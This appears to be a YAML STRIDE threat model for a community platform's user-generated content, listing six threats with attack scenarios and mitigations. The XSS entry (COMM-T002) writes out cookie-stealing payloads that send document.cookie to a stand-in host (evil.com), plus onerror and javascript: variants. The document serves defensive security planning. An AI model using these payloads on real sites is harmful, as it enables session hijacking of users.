@@ -1,0 +1,699 @@
+# STRIDE Threat Model: Community Interaction and User-Generated Content
+# Version: 1.0
+# Last Updated: 2026-06-23
+# Issue Reference: #855, #856
+# Owner: Security Team
+
+metadata:
+  domain: community_social
+  scope: "User-generated content, discussions, comments, social features, moderation, and community interactions"
+  classification: HIGH
+  compliance_frameworks:
+    - OWASP ASVS 4.0
+    - GDPR Article 5
+    - CDA Section 230
+  dependencies:
+    - endpoint-authorization-matrix.yaml (#854)
+    - auth-threat-model.yaml
+    - csp-headers.yaml (#856)
+
+domain:
+  name: "Community Interaction and User-Generated Content"
+  description: |
+    This domain encompasses all community-driven features including user profiles,
+    discussions, comments, reactions, content moderation, reputation systems,
+    and social interactions. User-generated content introduces XSS, injection,
+    and abuse risks that require comprehensive input validation and content security.
+
+  components:
+    - User profiles and bios
+    - Discussion threads and forums
+    - Comment systems
+    - Content reactions (likes, votes)
+    - Reputation and karma tracking
+    - Moderation queue and tools
+    - Content reporting and flagging
+    - User blocking and muting
+    - Community guidelines enforcement
+
+protected_assets:
+  - asset: "User-generated content (posts, comments, discussions)"
+    confidentiality: MEDIUM
+    integrity: CRITICAL
+    availability: HIGH
+    data_classification: PUBLIC_UGC
+
+  - asset: "User reputation and karma scores"
+    confidentiality: LOW
+    integrity: CRITICAL
+    availability: MEDIUM
+    data_classification: PUBLIC
+
+  - asset: "Moderation actions and decisions"
+    confidentiality: HIGH
+    integrity: CRITICAL
+    availability: HIGH
+    data_classification: INTERNAL
+
+  - asset: "Draft content and private discussions"
+    confidentiality: HIGH
+    integrity: HIGH
+    availability: MEDIUM
+    data_classification: CONFIDENTIAL
+
+  - asset: "User profile information"
+    confidentiality: MEDIUM
+    integrity: HIGH
+    availability: MEDIUM
+    data_classification: PII
+
+  - asset: "Content moderation queue and reports"
+    confidentiality: MEDIUM
+    integrity: HIGH
+    availability: HIGH
+    data_classification: INTERNAL
+
+trust_boundaries:
+  - boundary: "Anonymous → Public Content (Read)"
+    crossing_points:
+      - /api/community/discussions GET
+      - /api/community/comments GET
+      - /api/community/profiles/:id GET
+    authentication_required: false
+    content_security_policy: REQUIRED  # Issue #856
+
+  - boundary: "Authenticated Users → Content Creation (Write)"
+    crossing_points:
+      - /api/community/discussions POST
+      - /api/community/comments POST
+      - /api/community/profiles/:id PUT
+    authentication_required: true
+    authorization_required: true
+    input_validation_required: CRITICAL
+    xss_protection_required: CRITICAL  # Issue #856
+
+  - boundary: "Users → Moderation Reports"
+    crossing_points:
+      - /api/community/reports POST
+      - /api/community/block POST
+    authentication_required: true
+    rate_limiting_required: true
+
+  - boundary: "Moderators → Moderation Actions"
+    crossing_points:
+      - /api/community/moderate/*
+      - /api/community/reports/:id/resolve POST
+    authentication_required: true
+    authorization_required: true
+    role_required: "moderator"
+    audit_required: true
+
+threats:
+  - id: COMM-T001
+    stride_category: Spoofing
+    title: "User Impersonation via Username Similarity and Profile Manipulation"
+    description: |
+      Attackers could create accounts with visually similar usernames (homograph attack)
+      or manipulate profile information to impersonate legitimate users, moderators,
+      or staff members, leading to social engineering attacks and misinformation.
+    vector: "Account creation with confusable characters, profile manipulation"
+    attack_scenario: |
+      1. Attacker targets high-reputation user "admin_john"
+      2. Creates account with similar name:
+         - "admin_j0hn" (zero instead of 'o')
+         - "admin_john" (with invisible Unicode character)
+         - "admin․john" (with Unicode dot separator U+2024)
+      3. Copies legitimate user's profile picture and bio
+      4. Posts malicious content appearing to be from legitimate user
+      5. Users trust the impersonator (looks identical)
+      6. Phishing links, malicious advice, reputation damage
+      7. Community trust eroded
+    likelihood: HIGH
+    impact: MEDIUM
+    severity: MEDIUM
+    cvss_score: 5.8
+    cwe_id: CWE-290
+    affected_assets:
+      - "User profile information"
+      - "User-generated content (posts, comments, discussions)"
+      - "Community trust"
+    affected_components:
+      - User registration
+      - Profile management
+      - Username validation
+      - Display rendering
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        Username and profile integrity protection:
+
+        1. Username validation and normalization:
+           - Unicode normalization (NFC/NFKC)
+           - Confusable character detection:
+             * Block mixed-script usernames (Latin + Cyrillic)
+             * Detect homographs: "admin_j0hn" vs "admin_john"
+             * Use Unicode Confusables library
+           - Reserved username list (admin, moderator, staff, support)
+           - Similarity distance check (Levenshtein < 3 for existing usernames)
+           - Regex: ^[a-zA-Z0-9_-]{3,20}$ (simple, unambiguous charset)
+
+        2. Visual distinction for privileged users:
+           - Official badges (verified checkmark for staff/mods)
+           - Color-coded usernames (moderators in green)
+           - "Staff" tag prominently displayed
+           - Hover tooltip: "Official [Platform] Staff Member"
+
+        3. Profile verification:
+           - Email verification required
+           - Require unique email (prevent mass impersonation)
+           - Rate limit account creation: max 3 per IP per day
+           - CAPTCHA on registration
+
+        4. Impersonation detection:
+           - Automated similarity checks on registration
+           - User reporting: "Report impersonation" option
+           - Moderator review of flagged accounts
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Username change history (audit trail)
+        - Cooldown period: 30 days between username changes
+        - Warning banner: "This user recently changed their username"
+        - Profile picture restrictions (no official logos/branding)
+    additional_controls:
+      - "Machine learning model to detect impersonation patterns"
+      - "Community reporting mechanism with priority queue"
+      - "Proactive monitoring of high-profile user impersonations"
+
+  - id: COMM-T002
+    stride_category: Tampering
+    title: "Cross-Site Scripting (XSS) and HTML Injection in User Content - CRITICAL"
+    description: |
+      User-generated content (comments, posts, profiles) could contain malicious
+      JavaScript or HTML that executes in other users' browsers, stealing sessions,
+      credentials, or performing unauthorized actions. This is the HIGHEST priority
+      threat for community features. Related to Issue #856 (CSP headers).
+    vector: "Malicious HTML/JavaScript in user input fields"
+    attack_scenario: |
+      1. Attacker posts comment with XSS payload:
+         <script>
+           fetch('https://evil.com/steal?cookie=' + document.cookie);
+         </script>
+      2. Victim views the comment
+      3. JavaScript executes in victim's browser
+      4. Session token exfiltrated to attacker's server
+      5. Attacker uses token to impersonate victim
+      6. Posts spam, steals data, performs unauthorized actions
+      7. Widespread compromise if payload in popular post
+
+      Alternative payload:
+      - <img src=x onerror="alert(document.cookie)">
+      - <iframe src="javascript:alert('XSS')">
+      - <a href="javascript:void(fetch('evil.com?c='+document.cookie))">Click</a>
+    likelihood: CRITICAL
+    impact: CRITICAL
+    severity: CRITICAL
+    cvss_score: 9.3
+    cwe_id: CWE-79
+    affected_assets:
+      - "User-generated content (posts, comments, discussions)"
+      - "User session tokens and credentials"
+      - "All user data (potential for widespread compromise)"
+    affected_components:
+      - Comment submission/display
+      - Discussion creation/rendering
+      - Profile bio/description rendering
+      - Any user input display
+    primary_mitigation:
+      status: PARTIAL
+      control: |
+        CRITICAL - Multi-layer XSS defense (Issue #856):
+
+        1. Content Security Policy (CSP) headers:
+           - Strict CSP: default-src 'self'; script-src 'self'; object-src 'none'
+           - No 'unsafe-inline' or 'unsafe-eval'
+           - Report-only mode first, then enforce
+           - CSP violation reporting endpoint
+           - Reference: Issue #856 CSP implementation
+
+        2. Input sanitization (server-side):
+           - HTML sanitizer library (OWASP Java HTML Sanitizer, DOMPurify)
+           - Whitelist approach: allow only safe tags
+             * Allowed: <p>, <br>, <b>, <i>, <u>, <a>, <ul>, <ol>, <li>
+             * Blocked: <script>, <iframe>, <object>, <embed>, <form>
+           - Attribute whitelist: href, src (validated URLs only)
+           - Strip event handlers: onclick, onerror, onload, etc.
+           - URL validation: only http://, https://, mailto:
+
+        3. Output encoding (context-aware):
+           - HTML entity encoding for HTML context
+           - JavaScript encoding for JS context
+           - URL encoding for URL context
+           - Use templating engine with auto-escaping (Thymeleaf, Freemarker)
+
+        4. Markdown rendering (if used):
+           - Use secure Markdown parser (Flexmark, Commonmark)
+           - Disable raw HTML in Markdown
+           - Sanitize parser output
+
+        5. Defense in depth:
+           - HTTPOnly cookie flag (prevent JS access to session token)
+           - SameSite=Strict cookie attribute
+           - X-Content-Type-Options: nosniff
+           - X-XSS-Protection: 1; mode=block (legacy browsers)
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Regular XSS penetration testing
+        - Automated XSS scanning (OWASP ZAP, Burp Suite)
+        - Browser XSS auditor (deprecated but useful for old browsers)
+        - Subresource Integrity (SRI) for external scripts
+        - Trusted Types API (modern browsers)
+    additional_controls:
+      - "Bug bounty program with high XSS payouts"
+      - "Content preview mode (sandbox iframe for rendering)"
+      - "User education: don't click suspicious links in comments"
+      - "Rate limiting on content creation (slow down XSS testing)"
+
+  - id: COMM-T003
+    stride_category: Repudiation
+    title: "Content Manipulation Without Audit Trail"
+    description: |
+      Users or moderators could edit or delete content without proper audit logging,
+      enabling repudiation attacks, evidence tampering, or disputes over what was
+      said. Critical for content moderation disputes and legal compliance.
+    vector: "Content edit/delete without logging, missing version history"
+    attack_scenario: |
+      1. User posts offensive or illegal content
+      2. Content gets reported to moderators
+      3. User quickly edits content to remove offensive parts
+      4. Moderators review, see benign content
+      5. User claims: "I never posted that, reporter is lying"
+      6. No edit history or audit trail to prove original content
+      7. Cannot enforce community guidelines
+      8. Legal liability (if illegal content was posted)
+    likelihood: MEDIUM
+    impact: MEDIUM
+    severity: MEDIUM
+    cvss_score: 5.1
+    cwe_id: CWE-778
+    affected_assets:
+      - "User-generated content (posts, comments, discussions)"
+      - "Moderation actions and decisions"
+      - "Audit trail integrity"
+    affected_components:
+      - Content editing endpoints
+      - Content deletion logic
+      - Moderation system
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        Comprehensive content audit trail:
+
+        1. Edit history tracking:
+           - Store all content versions (append-only table)
+           - Each edit creates new version record:
+             * content_id, version_number, content_text, edited_at, edited_by
+           - Never UPDATE content, always INSERT new version
+           - Display "Edited" indicator with timestamp
+           - Link to view edit history (for author and moderators)
+
+        2. Deletion handling:
+           - Soft delete only (mark as deleted, don't physically remove)
+           - deleted_at timestamp, deleted_by user_id
+           - Content remains in database (moderation review)
+           - Display: "[Comment deleted by user/moderator]"
+           - Moderators can view deleted content
+
+        3. Moderation action logging:
+           - Log ALL moderation actions:
+             * action_type (warn, hide, delete, ban)
+             * moderator_id
+             * target_content_id or target_user_id
+             * reason/notes
+             * timestamp
+           - Immutable moderation log (append-only)
+           - Moderator dashboard: action history
+
+        4. Content snapshots for reports:
+           - When content is reported, capture snapshot
+           - Frozen version attached to report
+           - Cannot be altered even if original edited
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Legal hold capability (prevent deletion for legal cases)
+        - Export capability for evidence (timestamped PDF)
+        - Cryptographic signatures on content versions (tamper detection)
+        - Retention policy: keep all versions for 1 year minimum
+    additional_controls:
+      - "Moderator training on evidence preservation"
+      - "Compliance review of content retention policies"
+      - "Regular audit of moderation action logs"
+
+  - id: COMM-T004
+    stride_category: Information Disclosure
+    title: "Unauthorized Access to Draft Content and Private Discussions"
+    description: |
+      Draft content (unpublished posts/comments) or private discussions could be
+      accessed by unauthorized users through API vulnerabilities, IDOR, or caching
+      issues, exposing private thoughts or confidential community discussions.
+    vector: "IDOR, API parameter manipulation, caching exposure"
+    attack_scenario: |
+      1. User creates draft discussion: /api/community/drafts/12345
+      2. Attacker enumerates draft IDs: /api/community/drafts/12346
+      3. Missing authorization check allows access
+      4. Attacker reads other users' unpublished drafts
+      5. Gains competitive intelligence or embarrassing personal info
+      6. Privacy violation, GDPR breach (personal data exposure)
+
+      OR (caching scenario):
+      1. User views own draft discussion
+      2. Shared CDN caches draft content
+      3. Attacker requests same URL
+      4. CDN serves cached draft to unauthorized user
+    likelihood: MEDIUM
+    impact: HIGH
+    severity: HIGH
+    cvss_score: 6.9
+    cwe_id: CWE-639
+    affected_assets:
+      - "Draft content and private discussions"
+      - "User-generated content (posts, comments, discussions)"
+      - "User privacy"
+    affected_components:
+      - Draft management APIs
+      - Private discussion features
+      - Content rendering and caching
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        Strict authorization and caching controls:
+
+        1. Authorization enforcement:
+           - Draft access: only author can read/edit
+           - Service-layer checks (not just endpoint):
+             ```java
+             public Draft getDraft(draftId, currentUserId) {
+                 Draft draft = draftRepo.findById(draftId);
+                 if (!draft.authorId.equals(currentUserId)) {
+                     throw new UnauthorizedException();
+                 }
+                 return draft;
+             }
+             ```
+           - Database row-level security for drafts
+           - No draft ID enumeration (use UUIDs, not sequential IDs)
+
+        2. Caching controls:
+           - Cache-Control: private, no-store for drafts
+           - No CDN caching for authenticated content
+           - Vary: Cookie, Authorization headers
+           - ETag validation with user ID
+
+        3. Private discussions:
+           - Explicit participant list (ACL)
+           - Check membership before granting access
+           - Invitation-only model
+           - Participant removal triggers access revocation
+
+        4. API response filtering:
+           - Never return draft metadata in public lists
+           - Separate endpoints for drafts vs published content
+           - Include ownership checks in all queries
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Automated IDOR testing in CI/CD
+        - Regular access control audits
+        - Penetration testing for draft/private content access
+        - Monitoring and alerting on cross-user draft access attempts
+    additional_controls:
+      - "Bug bounty program with IDOR test cases"
+      - "Code review checklist: authorization on all read operations"
+      - "User education: draft vs published content awareness"
+
+  - id: COMM-T005
+    stride_category: Denial of Service
+    title: "Spam Flooding and Content Bomb Attacks"
+    description: |
+      Automated bots or malicious users could flood the platform with spam content
+      (comments, discussions) or extremely large content payloads, overwhelming
+      moderation resources, degrading user experience, and causing database bloat.
+    vector: "Automated high-volume posting, large content payloads"
+    attack_scenario: |
+      1. Attacker creates script to post comments rapidly
+      2. Posts 10,000 spam comments in 10 minutes:
+         - Cryptocurrency scams
+         - Malware links
+         - Offensive content
+      3. Moderation queue overwhelmed (500+ items backlog)
+      4. Legitimate user reports buried
+      5. Users see spam-filled discussions, poor experience
+      6. Database bloat (comments table growth)
+      7. Platform reputation damaged
+
+      OR (content bomb):
+      1. Attacker posts comment with 1MB of text
+      2. Repeats 1000 times
+      3. Database storage exhausted (1GB+ spam)
+      4. Queries slow down (large text fields)
+    likelihood: HIGH
+    impact: MEDIUM
+    severity: MEDIUM
+    cvss_score: 6.2
+    cwe_id: CWE-770
+    affected_assets:
+      - "User-generated content (posts, comments, discussions)"
+      - "Moderation queue and reports"
+      - "Platform availability and performance"
+    affected_components:
+      - Comment/discussion creation endpoints
+      - Moderation queue
+      - Database storage
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        Multi-layer anti-spam and rate limiting:
+
+        1. Rate limiting (aggressive for new users):
+           - New users (<7 days, <10 karma):
+             * Max 5 comments per hour
+             * Max 2 discussions per day
+           - Established users:
+             * Max 30 comments per hour
+             * Max 10 discussions per day
+           - Global: Max 1000 comments per minute (platform-wide)
+
+        2. Content size limits:
+           - Comment: max 5,000 characters
+           - Discussion post: max 50,000 characters
+           - Profile bio: max 500 characters
+           - Reject oversized content with 413 Payload Too Large
+
+        3. CAPTCHA challenges:
+           - Required after 10 posts in 1 hour
+           - Required for new accounts (<1 day old)
+           - Required after spam report on user
+           - hCaptcha or reCAPTCHA v3
+
+        4. Spam detection:
+           - Content analysis:
+             * Keyword blacklist (crypto scam phrases)
+             * URL pattern detection (bit.ly spam)
+             * Repetitive content detection (same text posted 10+ times)
+           - Behavioral signals:
+             * Posting speed (10 posts in 1 minute = suspicious)
+             * Low-effort content (one-word comments)
+             * No variation in content
+           - Reputation scoring:
+             * New accounts start with low trust
+             * Gain trust through legitimate activity
+             * Lose trust on spam reports
+
+        5. Automated moderation:
+           - Auto-hide suspected spam (moderator review required to publish)
+           - Auto-flag for moderator review
+           - Account auto-suspend after 5 spam flags
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Honeypot fields (hidden form fields that bots fill out)
+        - IP-based rate limiting (in addition to user-based)
+        - Suspicious activity dashboard for moderators
+        - Bulk moderation tools (delete all from user)
+        - Shadowban capability (user sees own posts, no one else does)
+    additional_controls:
+      - "Integration with spam databases (Akismet, Spamhaus)"
+      - "User reporting mechanism with quick response"
+      - "Periodic spam cleanup jobs (delete old spam)"
+
+  - id: COMM-T006
+    stride_category: Elevation of Privilege
+    title: "Unauthorized Moderation Access and Privilege Escalation"
+    description: |
+      Vulnerabilities in role checks could allow regular users to gain moderator
+      privileges, access moderation tools, perform moderation actions (delete content,
+      ban users), or manipulate reputation scores without authorization.
+    vector: "Missing role checks, API exploitation, privilege escalation"
+    attack_scenario: |
+      1. Attacker discovers moderation endpoint lacks @RolesAllowed check:
+         /api/community/moderate/delete
+      2. Regular user sends DELETE request to moderation endpoint
+      3. No role verification performed
+      4. User successfully deletes competitor's highly-rated content
+      5. Manipulates community discussions for personal gain
+      6. Bans legitimate users (vendetta)
+      7. Community trust and fairness destroyed
+
+      OR (reputation manipulation):
+      1. Attacker finds reputation adjustment API
+      2. Increments own karma score directly
+      3. Gains "trusted user" status
+      4. Unlocks privileged features (higher rate limits)
+      5. Unfair advantage over legitimate users
+    likelihood: LOW
+    impact: CRITICAL
+    severity: HIGH
+    cvss_score: 8.1
+    cwe_id: CWE-269
+    affected_assets:
+      - "Moderation actions and decisions"
+      - "User reputation and karma scores"
+      - "User-generated content (posts, comments, discussions)"
+      - "Community integrity"
+    affected_components:
+      - Moderation endpoints
+      - Reputation management
+      - Role-based access control
+    primary_mitigation:
+      status: RECOMMENDED
+      control: |
+        Strict role-based access control:
+
+        1. Moderation endpoint protection:
+           - @RolesAllowed("moderator") on ALL moderation endpoints
+           - Examples:
+             * /api/community/moderate/hide
+             * /api/community/moderate/delete
+             * /api/community/moderate/ban
+             * /api/community/reports/:id/resolve
+           - Service-layer role checks (defense in depth)
+
+        2. Reputation system integrity:
+           - No direct reputation modification API
+           - Reputation changes only through system events:
+             * +1 karma on upvote received
+             * -1 karma on downvote received
+             * +5 karma on accepted answer
+           - Database triggers enforce rules
+           - Reputation adjustment requires super-admin (manual review)
+
+        3. Role assignment controls:
+           - Only admins can grant moderator role
+           - Two-admin approval for new moderators
+           - Audit log all role changes
+           - Time-limited moderator roles (require periodic renewal)
+
+        4. Least privilege principle:
+           - Separate moderator roles:
+             * content_moderator: can hide/delete content
+             * user_moderator: can warn/suspend users
+             * report_reviewer: can review reports only
+           - Grant minimum necessary permissions
+
+        5. Automated privilege escalation detection:
+           - Alert on role changes
+           - Alert on moderation actions by non-moderators (shouldn't happen)
+           - Monitor reputation spikes (sudden +100 karma)
+    secondary_mitigation:
+      status: RECOMMENDED
+      control: |
+        - Regular RBAC audit (quarterly review of role assignments)
+        - Penetration testing for privilege escalation
+        - Moderator activity monitoring (dashboard)
+        - Just-in-time (JIT) moderation access (temporary elevation)
+    additional_controls:
+      - "Moderator code of conduct and training"
+      - "Community oversight (moderator actions visible to users)"
+      - "Moderator election process (community-driven)"
+
+prioritization:
+  critical:
+    - COMM-T002  # XSS - Highest priority, widespread impact
+  high:
+    - COMM-T004  # Unauthorized draft access
+    - COMM-T006  # Unauthorized moderation access
+  medium:
+    - COMM-T001  # User impersonation
+    - COMM-T003  # Content manipulation without audit
+    - COMM-T005  # Spam flooding
+  low: []
+
+compliance_mapping:
+  OWASP_ASVS_4.0:
+    - V5.2: Sanitization and Sandboxing Requirements (COMM-T002)
+    - V5.3: Output Encoding and Injection Prevention (COMM-T002)
+    - V7.1: Log Content Requirements (COMM-T003)
+    - V4.1: Access Control Design (COMM-T004, COMM-T006)
+    - V11.1: Business Logic Security (COMM-T005)
+
+  GDPR:
+    - Article 5(1)(f): Integrity and Confidentiality (COMM-T002, COMM-T004)
+    - Article 25: Data Protection by Design (COMM-T003)
+    - Article 32: Security of Processing (all threats)
+
+  CDA_Section_230:
+    # Communications Decency Act - platform liability
+    - Good faith moderation (COMM-T003, COMM-T006)
+    - User content vs platform content (COMM-T002)
+
+metrics:
+  total_threats: 6
+  by_stride:
+    spoofing: 1
+    tampering: 1
+    repudiation: 1
+    information_disclosure: 1
+    denial_of_service: 1
+    elevation_of_privilege: 1
+  by_severity:
+    critical: 1
+    high: 2
+    medium: 3
+    low: 0
+
+  risk_score: 7.8/10
+  remediation_effort: HIGH
+  estimated_hours: 110
+
+mitigation_summary:
+  existing: 1
+  partial: 1
+  recommended: 16
+  planned: 0
+
+review_schedule:
+  initial_review: 2026-06-23
+  next_review: 2026-08-23
+  review_frequency: BIMONTHLY
+  review_triggers:
+    - New community feature added
+    - XSS or injection vulnerability discovered
+    - Major spam incident
+    - Community growth milestone (10k+ users)
+    - Moderation policy changes
+    - Compliance audit scheduled
+
+notes: |
+  CRITICAL PRIORITY: COMM-T002 (XSS) must be addressed before public launch.
+  Related to Issue #856 (CSP headers) - coordinate implementation.
+
+  Community features are high-risk due to user-generated content. Comprehensive
+  input validation, output encoding, and Content Security Policy are mandatory.
+
+  Regular penetration testing focused on XSS, injection, and authorization bypass
+  is essential for this domain.
+
+  Consider implementing a bug bounty program with high payouts for XSS and
+  privilege escalation vulnerabilities.
